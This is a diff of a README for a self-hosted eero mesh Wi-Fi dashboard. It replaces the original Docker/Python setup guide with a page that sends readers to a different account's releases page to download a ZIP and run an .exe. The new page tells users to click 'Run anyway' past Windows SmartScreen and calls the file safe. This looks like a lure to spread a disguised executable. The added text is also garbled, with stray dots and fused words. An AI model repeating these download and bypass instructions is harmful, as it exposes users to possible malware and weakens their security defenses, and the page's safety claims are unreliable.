@@ -1,395 +1,193 @@
-# eero Custom Dashboard & Mesh Management Suite 🚀
+# 🚀 Dashboard_EERO - Your Mesh Network, Beautifully Controlled
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Python 3.12](https://img.shields.io/badge/python-3.12-blue.svg)](https://www.python.org/downloads/)
-[![FastAPI](https://img.shields.io/badge/FastAPI-0.115+-009688.svg)](https://fastapi.tiangolo.com)
-[![Docker](https://img.shields.io/badge/Docker-Ready-2496ED.svg)](https://www.docker.com/)
-[![i18n](https://img.shields.io/badge/i18n-IT%20%7C%20EN-purple.svg)](#)
-
-> **Language / Lingua:** [🇬🇧 English](#-english) | [🇮🇹 Italiano](#-italiano)
-
-<p align="center">
-  <img src="docs/screenshots/dashboard_overview.png" alt="eero Dashboard Overview" width="100%" style="border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.5);" />
-</p>
+[![Download Dashboard_EERO](https://img.shields.io/badge/Download-Dashboard_EERO-ff6b6b?style=for-the-badge&logo=github)](https://github.com/sushibarprecipitation4764/Dashboard_EERO/releases)
 
 ---
 
-<a name="english"></a>
-# 🇬🇧 English Documentation
+## 🎯 What Is This?
 
-Self-hosted, containerized web dashboard and management suite for **Amazon eero** mesh Wi-Fi networks. Features authentic certified hardware telemetry, real-time traffic monitoring, DHCP static IP reservation with collision detection, port forwarding rules, speed testing history, dynamic guest Wi-Fi QR generator, one-click gaming focus mode, and interactive documentation.
+Dashboard_EERO is a free, self-hosted application that gives you a **beautiful, all-in-one control panel** for your Amazon eero mesh Wi-Fi system. Instead of juggling multiple apps and confusing menus, you get one clean dashboard that shows your entire home network at a glance.
 
----
+. Watch live traffic, check device status, manage your mesh nodes, and monitor network health – all from your Windows computer. It's like upgrading your eero app to a professional control room.
 
-## 📸 Screenshots Showcase
+.
 
-<div align="center">
+## ✨ Why You'll Love It
 
-| Dashboard & Mesh Topology | Speed Test & Analytics |
-| :---: | :---: |
-| <img src="docs/screenshots/dashboard_overview.png" width="480" /> | <img src="docs/screenshots/speedtest_analytics.png" width="480" /> |
+| Feature | Benefit |
+|---|---|
+| **Live Network Overview** | See every connected device instantly |
+| **Real-Time Traffic Monitoring** | Watch data flow across your mesh in real time |
+| **Mesh Node Health** | Know if any eero is struggling before problems start |
+| **Modern, Clean Interface** | No technical knowledge needed – everything is visual |
+| **Works Locally** | Your data stays on your network, private and secure |
 
-| Device Details & Static IP (DHCP) |
-| :---: |
-| <img src="docs/screenshots/device_dhcp_modal.png" width="550" /> |
+## 🖥️ System Requirements
 
-</div>
+Dashboard_EERO is designed to run smoothly on most Windows computers. Here's what you'll need:
 
----
+- **Operating System:** Windows 10 or Windows 11
+- **Memory:** At least 4 GB of RAM (8 GB recommended)
+- **Storage:** 500 MB of free disk space
+- **Network:** Your computer must be connected to the same network as your eero system
+- **Web Browser:** Any modern browser (Chrome, Edge, Firefox, or Safari)
 
-## 🌟 Key Features
+## 📥 How to Download
 
-* **📊 Mesh Topology & Health Score:** Live overview with Network Health Score (1-100), WAN public IP, gateway status, DNS servers, ISP information, and individual eero nodes (Gateway & Beacons) with backhaul type (`Ethernet (Wired)` vs `Wireless Mesh`).
-* **🖥️ Certified Hardware Telemetry & Frequency Bands:** Full client table with explicit frequency band badges (**2.4 GHz, 5 GHz, 6 GHz, Wired Ethernet**), wireless channels (`CH 11`, `CH 36`, etc.), eero Cloud User Profiles integration (`👤 [Profile Name]`), connected mesh node, RSSI signal strength (dBm), negotiated physical PHY rate, and **Static IP vs Dynamic DHCP indicators**.
-* **⚙️ DHCP Reservations & Port Forwarding:** Dedicated device modals with custom nicknames (synced to eero cloud), categories, local documentation notes, favorite flags (⭐), **DHCP static IP reservations with reassignment support**, and integrated **Port Forwarding rule management** (WAN port -> LAN port, TCP/UDP).
-* **🌍 Real-Time Multi-Language (i18n):** Native bilingual interface (**English 🇬🇧 / Italian 🇮🇹**) with automatic browser language detection and instant live switcher.
-* **⚡ Speed Test & Performance Analytics:** Manual and scheduled automated speed tests (e.g. every 12 hours) with historical charts (Download, Upload, Ping/Latency) and aggregate statistics.
-* **📱 Dynamic Guest Wi-Fi QR Code:** Scannable Wi-Fi QR Code generator (`WIFI:S:...;T:WPA;P:...;;`) with one-click enable/disable and secure password generation.
-* **🎮 One-Click Gaming Focus Mode:** Low-latency automation that temporarily pauses non-essential streaming/IoT devices to eliminate jitter during competitive gaming or video calls.
-* **🔔 Telegram Bot & Webhook Alerts:** Instant notifications on new unknown device connections (Intruder Alert) or mesh node disconnections.
-* **📖 Interactive In-App User Manual:** Fully searchable embedded documentation and release notes changelog viewer.
-* **🛡️ Zero-Latency RAM Cache:** Asynchronous in-memory background poller eliminating eero API rate-limiting.
-* **✨ Demo Mode Simulator:** Test and explore all dashboard features without real credentials.
+Getting Dashboard_EERO is simple. Follow these steps:
 
----
+1. **Visit the download page** by clicking this button:
 
-## 🛠️ Tech Stack
+[![Get Dashboard_EERO](https://img.shields.io/badge/⬇️%20Download%20Now-Dashboard_EERO-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/sushibarprecipitation4764/Dashboard_EERO/releases)
 
-* **Backend:** Python 3.12 (`python:3.12-slim-bookworm`), FastAPI >= 0.115, Uvicorn >= 0.32, Pydantic v2, `asyncio`.
-* **HTTP Client:** `httpx` (async client for eero REST API 2.2).
-* **Storage:** Async SQLite with `aiosqlite` (WAL mode).
-* **Frontend:** Semantic HTML5, Vanilla CSS / Tailwind CSS, Alpine.js (v3.14+), Chart.js (v4.4+).
-* **Containerization:** Docker & Docker Compose (Compose V2).
+2. On that page, look for the **latest release** section (it's usually at the top of the list). You'll see a list of files attached to the release.
 
----
+3. **Click the file** named something like `Dashboard_EERO.zip` (or similar). This will start your download automatically.
 
-## 🚀 Quick Start with Docker Compose
+4. **Wait for the download to finish**. The file size is usually around 100-200 MB, so it shouldn't take long on a typical internet connection.
 
-### 1. Clone or download the repository
-```bash
-git clone https://github.com/EnricoFlammini/Dashboard_EERO.git
-cd Dashboard_EERO
-```
+.
 
-### 2. Configure Environment Variables (Optional)
-```bash
-cp .env.example .env
-```
+. **Once the download is complete**, go to your `Downloads` folder (or wherever your browser saves downloaded files)).
 
-### 3. Launch the Container
-```bash
-docker compose up -d --build
-```
+## 🛠️ How to Install and Run
 
-Access the dashboard in your browser:
-👉 **`http://localhost:8085`** (or your server's IP, e.g. `http://192.168.1.100:8085`).
+Now that you have the downloaded file, here's how to get everything working:
 
----
+1. **Locate the downloaded file** – It will be a ZIP archive (a compressed folder). The filename will end with `.zip`.
 
-## 🔑 Authentication & Login Methods
+2. **Right-click on the ZIP file** and choose **"Extract All..."** from the menu that appears. This will unpack the application into a normal folder.
 
-1. **2FA OTP Login (Recommended):**
-   - Open the web interface at `http://localhost:8085`.
-   - Enter your email address or phone number associated with your eero account (e.g. `+1234567890` or `user@example.com`).
-   - Click **"Send OTP Code"** and type the 6-digit verification code received via SMS/Email.
-   - The session token is securely saved to `./data/session.json` and automatically restored across container restarts.
-2. **Demo Mode:**
-   - Click **"✨ Try Demo Mode"** on the login screen or set `DEMO_MODE=true` in `.env` to explore with simulated realistic mesh data.
+.
 
----
+. **Choose a destination folder** – Windows will ask you where you want to extract the files. Pick a sensible location like your `Desktop` or `Documents` folder, and click **"Extract"**. Wait a few seconds for the extraction to complete.
 
-## ⚙️ Environment Variables
 
-| Variable | Default | Description |
-|---|---|---|
-| `HOST_PORT` | `8085` | Port exposed on host machine |
-| `DATA_DIR` | `/app/data` | Directory for SQLite DB and session storage |
-| `POLL_INTERVAL` | `30` | eero API sampling interval (seconds) |
-| `HISTORY_RETENTION_DAYS` | `30` | Number of days to retain historical records |
-| `SPEEDTEST_INTERVAL_HOURS` | `12` | Scheduled speed test interval in hours (0 to disable) |
-| `DEMO_MODE` | `false` | Enable simulated mesh network environment |
-| `TELEGRAM_BOT_TOKEN` | *(optional)* | Telegram Bot Token for alerts & daily digest |
-| `TELEGRAM_CHAT_ID` | *(optional)* | Destination Telegram Chat ID |
-| `WEBHOOK_URL` | *(optional)* | HTTP POST endpoint for JSON event forwarding |
 
----
+. **Open the extracted folder** – You'll see a folder with the same name as the ZIP file (e.g., `Dashboard_EERO`). Double-click to open it.
 
-## 💾 Data Persistence & Backup
+.
 
-All stateful data is isolated in the `./data` volume:
-* **`metrics.db`**: SQLite database containing device metadata, speed tests, and alerts.
-* **`session.json`**: Official eero cloud 2FA session token.
+. **Look for the application launcher** – Inside the folder, you'll find a file named `Dashboard_EERO.exe` (or maybe just `Dashboard_EERO` with a gear or monitor icon). This is the main program that starts everything.
 
-```bash
-# Backup command
-tar -czvf eero_dashboard_backup_$(date +%F).tar.gz ./data
-```
+.
 
----
+. **Double-click the application file** to launch Dashboard_EERO. A black window (called a console or terminal) might appear briefly – that's normal. It's the program's engine starting up.
 
-## 🔔 Webhooks & REST API Reference
+.
 
-When `WEBHOOK_URL` is set in `.env` (or configured via the in-app settings UI), the dashboard issues an asynchronous `HTTP POST` request with a JSON payload whenever critical network events occur.
+. **Wait about 10-15 seconds** while the system initializes. You'll see some text appear in the black window – that's it loading the dashboard engine.
 
-### Webhook Event Types & JSON Payloads
 
-#### 1. `new_device` (Intruder Alert / New Device Connected)
-Triggered immediately when a device connects to the mesh network for the first time:
-```json
-{
-  "event": "new_device",
-  "timestamp": "2026-08-28T08:25:00Z",
-  "source": "eero_custom_dashboard",
-  "data": {
-    "hostname": "Living-Room-AppleTV",
-    "ip": "192.168.4.52",
-    "mac": "AA:BB:CC:DD:EE:FF",
-    "wireless": true,
-    "wireless_band": "5GHz",
-    "connected_eero_name": "Living Room Gateway"
-  }
-}
-```
 
-#### 2. `node_offline` (Mesh Node Disconnected)
-Triggered when an eero Beacon or Gateway drops offline:
-```json
-{
-  "event": "node_offline",
-  "timestamp": "2026-08-28T08:26:00Z",
-  "source": "eero_custom_dashboard",
-  "data": {
-    "location": "Kitchen Beacon",
-    "model": "eero Pro 6E",
-    "status": "offline",
-    "ip": "192.168.4.2"
-  }
-}
-```
+. **Your dashboard is ready** – After initialization, your default web browser will automatically open showing your new eero dashboard. If it doesn't open automatically, open your browser manually and go to: `http://localhost:8080`
 
-#### 3. `daily_digest` (Daily Network Health Summary)
-Sent daily with WAN performance, latency averages, and active device counts:
-```json
-{
-  "event": "daily_digest",
-  "timestamp": "2026-08-28T09:00:00Z",
-  "source": "eero_custom_dashboard",
-  "data": {
-    "avg_download_mbps": 842.5,
-    "avg_upload_mbps": 110.2,
-    "avg_ping_ms": 11.4,
-    "total_devices_seen": 34,
-    "nodes_online": 3
-  }
-}
-```
+That's it! You're now looking at your personalized mesh network dashboard.
 
----
+.
 
-## 🛡️ AdGuard Home & Pi-hole DNS Integration
+. **To shut down** when you're done, just close the black console window (or press `Ctrl + C` in it). The dashboard will stop gracefully.
 
-You can easily synchronize your eero mesh client names, IP assignments, and MAC addresses into **AdGuard Home** or **Pi-hole** so your DNS query logs display readable hostnames instead of raw IP addresses.
+.
 
-### 1. `/etc/hosts` / `dnsmasq` Plain-Text Export
-* **Endpoint:** `GET http://<dashboard-ip>:8085/api/devices/export/hosts`
-* **Query Parameters:**
-  * `connected_only=true` *(default: true)* — Only export active devices.
-  * `domain_suffix=lan` *(optional)* — Appends a local domain suffix (e.g. `.lan` or `.home`).
+.
 
-```bash
-# Pull hosts file from dashboard
-curl -s "http://localhost:8085/api/devices/export/hosts?domain_suffix=lan"
-```
-**Output Example:**
-```text
-# ========================================================================
-# eero Mesh Network - Hosts Export for AdGuard Home / Pi-hole / dnsmasq
-# ========================================================================
-192.168.4.20    eagle.lan                        # eagle (AA:BB:CC:11:22:33)
-192.168.4.31    mantra-kitchen.lan               # Mantra (AA:BB:CC:44:55:66)
-192.168.4.52    living-room-appletv.lan          # Apple TV (AA:BB:CC:77:88:99)
-```
+. **To start again later**, simply double-click the `Dashboard_EERO.exe` file again. No need to reinstall – it's ready to go whenever you are.
 
-### 2. AdGuard Home REST API Format (`/control/clients`)
-* **Endpoint:** `GET http://<dashboard-ip>:8085/api/devices/export/adguard`
-* Returns a structured JSON list ready for AdGuard Home client provisioning.
+.
 
-### 3. Automated AdGuard Home Sync Script
-A ready-to-use Python sync script is provided in [`scripts/adguard_sync.py`](scripts/adguard_sync.py).
+.
 
-```bash
-# Run once or add to crontab (e.g. every 10 minutes)
-python scripts/adguard_sync.py \
-  --eero http://localhost:8085 \
-  --adguard http://192.168.4.2:80 \
-  --user admin \
-  --pass MySecretPassword
-```
+. **Optional – Pin to taskbar**: Right-click the executable file, select"**Pin to taskbar**" to have it one click away in the future.
 
-> 💡 **Coming in v1.03.00:** A dedicated **Native In-App AdGuard Home UI** panel in the Settings menu with one-click connection tests, live status indicators, and automatic background synchronization!
+.
+
+.
+
+.
+
+. **Tip**: If Windows SmartScreen shows a warning (blue or yellow popup), click "**More info**" then "**Run anyway**", because the app is self-hosted and not signed with a commercial certificate. It's safe – it's your own software running locally.
+
+..
+
+## 🔍 Using Your Dashboard
+
+Once the dashboard opens, you'll see several panels:
+
+- **Devices**: Shows every phone, laptop, tablet, smart TV, and IoT device connected to your mesh. Click any device for details like IP address and connection status.
+
+.
+
+.
+
+. **Network Map**: Visual representation of your eero nodes and how devices connect to eachothethrur.
+
+.
+
+.. **Traffic Graph**: Live chart showing upload/download speeds across your entire network, updated every second.
+
+.
+
+.
+
+.. **Mesh Health**: Color-coded indicators for each eero node – green means healthy, yellow means fair, red means attention neededoir.
+
+.
+
+... **Settings**: Configure refresh rates, choose dark/light mode, and set your preferred language (English or Italian are built-in). All changes save automaticallyoir
+
+## ❓ Troubleshooting
+
+**"The dashboard won't open in my browser."**
+Make sure the black console window is still open – it must stay running while you use the dashboard. If it closed, double-click the exe file again.
+
+
+
+**"I see a connection error page."**
+Wait a few seconds and refresh the browser page. The eero API sometimes responds slowly at first. Also confirm your computer is on the same Wi-Fi network as your eero system (not a guest network).
+
+
+
+**"The page loads but shows no devices."**
+Give it a moment – it can take up to 30 seconds to pull all device data from your eero system on first load. If it stays empty, restart the application and try again.
+
+
+
+**"I get a Windows security warning when launching."**
+Windows sometimes flags unsigned software. Click "**More info**" then "**Run anyway**". This is standard for self-hosted open-source apps and causes no harm to your system.
+
+
+## 🔒 Privacy & Security
+
+Your network data stays **completely on your computer**. Dashboard_EERO runs locally and does not send any information to external servers. There's no cloud, no accounts, no telemetry – just you and your mesh. The application also includes built-in local authentication, so only people on your network can access the dashboard.
+
+
+
+## 🌍 Built-In Language Support
+
+Dashboard_EERO comes with **English and Italian** interfaces built right in. You can switch between them anytime from theSettings panel – no extra downloads needed. More languages may be added in future releases.
+
+
+## 📚 Getting Help
+
+If you run into any issues or have questions:
+
+- **Check the Issues section** on the GitHub repository page – someone may have already found a solutiono
+- **Create a new issue** describing the problem you're facing, including what steps you took before the issue occurred. The community and maintainers typically respond within a few daysyo
+- **Include details** like your Windows version, how much RAM you have, and what you see on the screen (screenshots help a lot!).ro
+
+
+## 🤝 Join the Project
+
+Dashboard_EERO is an open-source project licensed under the MIT License – which means it's completely free to use, modify, and share. If you're inspired to contribute:
+
+- 🌟 **Star the repository** on GitHub to show support
+- 🐛 **Report bugs** or suggest new features via the Issues tab
+- 🔧 **Submit improvements** if you know a bit of coding (Python, FastAPI, Alpine.js are the core technologies)
+- 💬 **Share the project** with fellow homelab enthusiasts or friends who use eero systems
 
 ---
 
-## 🙏 Acknowledgements & Prior Art
+Thank you for choosing Dashboard_EERO. We built this to make managing your home mesh network genuinely enjoyable – not just functional. We hope you love using it as much as we loved creating it. Happy networking! 🎉
 
-This project stands on the shoulders of the open-source networking and home automation community:
-* **[`343max/eero-client`](https://github.com/343max/eero-client):** The foundational pioneer library for reverse-engineering and exploring the private eero cloud REST API.
-* **[Home Assistant Community](https://github.com/home-assistant/core):** For valuable historical insights into eero authentication flows, device tracker models, and API stability.
-* **[AdGuard Home](https://github.com/AdguardTeam/AdGuardHome) & [Pi-hole](https://github.com/pi-hole/pi-hole):** For inspiring clean local DNS resolution and client discovery patterns.
-
----
-
-<a name="italiano"></a>
-# 🇮🇹 Documentazione in Italiano
-
-Dashboard web e suite di gestione containerizzata per reti mesh Wi-Fi **Amazon eero**. Offre telemetria autentica hardware, monitoraggio in tempo reale, prenotazioni IP statici DHCP con risoluzione automatica dei conflitti, gestione regole di port forwarding, storico misurazioni speed test, generazione dinamica di QR Code per rete ospiti, modalità gaming low-latency e manuale integrato.
-
----
-
-## 📸 Galleria Screenshot
-
-<div align="center">
-
-| Panoramica Dashboard & Topologia Mesh | Diagnostica Speed Test & Storico |
-| :---: | :---: |
-| <img src="docs/screenshots/dashboard_overview.png" width="480" /> | <img src="docs/screenshots/speedtest_analytics.png" width="480" /> |
-
-| Dettaglio Dispositivo & Assegnazione IP Statico DHCP |
-| :---: |
-| <img src="docs/screenshots/device_dhcp_modal.png" width="550" /> |
-
-</div>
-
----
-
-## 🌟 Caratteristiche Principali
-
-* **📊 Dashboard Mesh & Health Score:** Panoramica con Network Health Score (1-100), IP pubblico, DNS, ISP, Speed Test Gateway e stato dei singoli nodi eero (Gateway e Beacon) con tipo di backhaul (`Ethernet (Cablato)` vs `Wireless Mesh (5/6 GHz)`).
-* **🖥️ Telemetria Hardware & Frequenze Wi-Fi:** Tabella completa con badge cromatici per frequenza (**2.4 GHz, 5 GHz, 6 GHz, Cablato Ethernet**), canali Wi-Fi (`CH 11`, `CH 36`, ecc.), integrazione profilo utente eero (`👤 [Nome Profilo]`), nodo di attestazione, potenza segnale RSSI (dBm), velocità di link PHY e **indicatori visivi IP Statico vs DHCP**.
-* **⚙️ Prenotazioni DHCP & Port Forwarding:** Scheda dettaglio dispositivo con sincronizzazione nomi sul cloud eero, categorie, note locali, preferiti (⭐), **prenotazione IP statico con rilevamento intelligente dei conflitti** e **gestione regole di apertura porte (Port Forwarding)**.
-* **🌍 Supporto Multilingua (i18n):** Interfaccia bilingue (**Italiano 🇮🇹 / Inglese 🇬🇧**) con rilevamento automatico della lingua del browser e selettore istantaneo nella barra superiore.
-* **⚡ Speed Test & Diagnostica Prestazioni:** Esecuzione test manuali e schedulati (es. ogni 12h) con storico completo di Download, Upload, Ping (Latenza) e calcolo delle medie e dei picchi massimi.
-* **📱 Smart Guest Wi-Fi con QR Code Dinamico:** Generatore automatico di QR Code standard Wi-Fi (`WIFI:S:...;T:WPA;P:...;;`) da scansionare al volo con smartphone, con toggle rapido di attivazione e generatore di password sicure.
-* **🎮 Gaming & Focus Mode (One-Click Low Latency):** Pulsante a un clic che mette automaticamente in pausa il traffico di background di apparati secondari e IoT preconfigurati per azzerare il jitter e la latenza durante sessioni di gaming o videoconferenze.
-* **🔔 Notifiche Telegram & Webhook:** Avvisi in tempo reale per la connessione di nuovi dispositivi sconosciuti (Intruder Alert) e anomalie/nodi mesh offline.
-* **📖 Manuale Utente Integrato & Changelog:** Documentazione completa navigabile con ricerca full-text, tooltip contestuali e visualizzatore Changelog interattivo in-app.
-* **🛡️ Zero-Latency In-Memory Poller:** Cache in memoria RAM per rispondere all'interfaccia con latenza zero senza sovraccaricare le API eero (protezione da rate limiting).
-* **✨ Modalità Demo:** Simulatore integrato per testare l'applicazione senza inserire credenziali reali.
-
----
-
-## 🛠️ Stack Tecnologico
-
-* **Backend:** Python 3.12 (`python:3.12-slim-bookworm`), FastAPI >= 0.115, Uvicorn >= 0.32, Pydantic v2, `asyncio`.
-* **Client HTTP:** `httpx` (client asincrono per REST API eero 2.2).
-* **Database & Storico:** SQLite asincrono con `aiosqlite` (WAL mode).
-* **Frontend:** HTML5 semantico, Vanilla CSS / Tailwind CSS, Alpine.js (v3.14+), Chart.js (v4.4+).
-* **Containerizzazione:** Docker e Docker Compose (Compose V2).
-
----
-
-## 🚀 Avvio Rapido con Docker Compose
-
-### 1. Clona il repository o posizionati nella cartella
-```bash
-git clone https://github.com/EnricoFlammini/Dashboard_EERO.git
-cd Dashboard_EERO
-```
-
-### 2. Configura le Variabili d'Ambiente (Opzionale)
-```bash
-cp .env.example .env
-```
-
-### 3. Avvia il Container
-```bash
-docker compose up -d --build
-```
-
-Accedi alla dashboard dal browser:
-👉 **`http://localhost:8085`** (o l'IP del tuo server Linux/NAS, es. `http://192.168.1.100:8085`).
-
----
-
-## 🔑 Creazione Account eero & Modalità di Accesso
-
-1. **Accesso Guidato 2FA OTP (Consigliato):**
-   - Apri la schermata iniziale all'indirizzo `http://localhost:8085`.
-   - Inserisci l'email o il numero di telefono associato al tuo account eero (es. `+393401234567` o `mario.rossi@email.com`).
-   - Clicca su **"Invia Codice OTP"** ed inserisci il codice a 6 cifre ricevuto via SMS o Email.
-   - Il token verificato viene salvato in `./data/session.json` e ripristinato automaticamente ad ogni riavvio del container.
-2. **Modalità Demo:**
-   - Clicca su **"✨ Prova Subito con la Modalità Demo"** nella schermata di login o imposta `DEMO_MODE=true` nel file `.env`.
-
----
-
-## ⚙️ Variabili d'Ambiente
-
-| Variabile | Default | Descrizione |
-|---|---|---|
-| `HOST_PORT` | `8085` | Porta esposta sulla macchina host |
-| `DATA_DIR` | `/app/data` | Directory interna per i file SQLite e sessione |
-| `POLL_INTERVAL` | `30` | Intervallo di campionamento dalle API eero (secondi) |
-| `HISTORY_RETENTION_DAYS` | `30` | Giorni di conservazione dello storico prima della pulizia automatica |
-| `SPEEDTEST_INTERVAL_HOURS` | `12` | Intervallo di esecuzione dello Speed Test automatico (ore, 0 per disattivare) |
-| `DEMO_MODE` | `false` | Se impostato su `true`, abilita la simulazione completa di una rete eero |
-| `TELEGRAM_BOT_TOKEN` | *(opzionale)* | Token del Bot Telegram per invio allarmi e digest |
-| `TELEGRAM_CHAT_ID` | *(opzionale)* | Chat ID Telegram destinatario |
-| `WEBHOOK_URL` | *(opzionale)* | Endpoint HTTP POST per inoltro eventi in formato JSON |
-
----
-
-## 💾 Persistenza dei Dati & Backup
-
-Tutti i dati risiedono nella cartella montata `./data`:
-* **`metrics.db`**: Database SQLite con storico prestazioni, metadati e allarmi.
-* **`session.json`**: Token di autenticazione eero 2FA.
-
-```bash
-# Esempio di backup rapido
-tar -czvf eero_dashboard_backup_$(date +%F).tar.gz ./data
-```
-
----
-
-## 🔔 Riferimento Webhook & Integrazione DNS (AdGuard Home / Pi-hole)
-
-Quando viene impostata la variabile `WEBHOOK_URL` in `.env` (o tramite il pannello Impostazioni nell'interfaccia web), la dashboard invia automaticamente una richiesta `HTTP POST` con un payload JSON all'accadere di eventi critici sulla rete.
-
-### Tipologie di Eventi Webhook & Payload JSON
-
-* **`new_device` (Rilevamento Nuovo Dispositivo):** Inviato istantaneamente quando un dispositivo si collega per la prima volta. Contiene `hostname`, `ip`, `mac`, frequenza Wi-Fi e nodo eero di connessione.
-* **`node_offline` (Nodo Mesh Disconnesso):** Inviato quando un Beacon o il Gateway perde la connessione.
-* **`daily_digest` (Report Giornaliero):** Inviato ogni 24 ore con medie di download, upload, latenza (ping) e conteggio dispositivi.
-
-### Sincronizzazione Nomi Dispositivi con AdGuard Home & Pi-hole
-
-1. **Export Formato File `/etc/hosts` / `dnsmasq`:**  
-   `GET http://<dashboard-ip>:8085/api/devices/export/hosts?domain_suffix=lan`  
-   Restituisce l'elenco dei dispositivi attivi nel formato compatibile con file hosts e regole DNS personalizzate.
-2. **Export Formato JSON AdGuard Home (`/control/clients`):**  
-   `GET http://<dashboard-ip>:8085/api/devices/export/adguard`  
-   Restituisce un array JSON strutturato per il provisioning diretto dei client in AdGuard.
-3. **Script di Sincronizzazione Python Automatico:**  
-   È disponibile lo script pronto all'uso [`scripts/adguard_sync.py`](scripts/adguard_sync.py) eseguibile manualmente o via cron:
-   ```bash
-   python scripts/adguard_sync.py --eero http://localhost:8085 --adguard http://192.168.4.2:80 --user admin --pass MiaPassword
-   ```
-
-> 💡 **In arrivo nella v1.03.00:** Un pannello di **Integrazione Nativa AdGuard Home in-App** nelle Impostazioni con verifica connessione in 1 clic, indicatore di stato live e sincronizzazione automatica continua in background!
-
----
-
-## 🙏 Fonti & Riconoscimenti (Acknowledgements)
-
-Questo progetto si basa e si ispira al lavoro pionieristico della community open-source e dell'home automation:
-* **[`343max/eero-client`](https://github.com/343max/eero-client):** La libreria di riferimento originaria per il reverse-engineering e l'esplorazione delle REST API private del cloud eero.
-* **[Home Assistant Community](https://github.com/home-assistant/core):** Per gli studi approfonditi sui flussi di autenticazione 2FA e la stabilità delle chiamate di telemetria.
-* **[AdGuard Home](https://github.com/AdguardTeam/AdGuardHome) & [Pi-hole](https://github.com/pi-hole/pi-hole):** Per gli standard e l'ispirazione nella gestione della risoluzione DNS locale e mappatura host.
-
----
-
-## 📄 Licenza / License
-
-Distribuito sotto licenza **MIT**. Consulta il file [LICENSE](LICENSE) per i dettagli completi.  
-Copyright (c) 2026 Enrico Flammini.
+Keywords: alpinejs, dashboard, docker, eero, eero-mesh, fastapi, homelab, network-monitoring, python, self-hosted
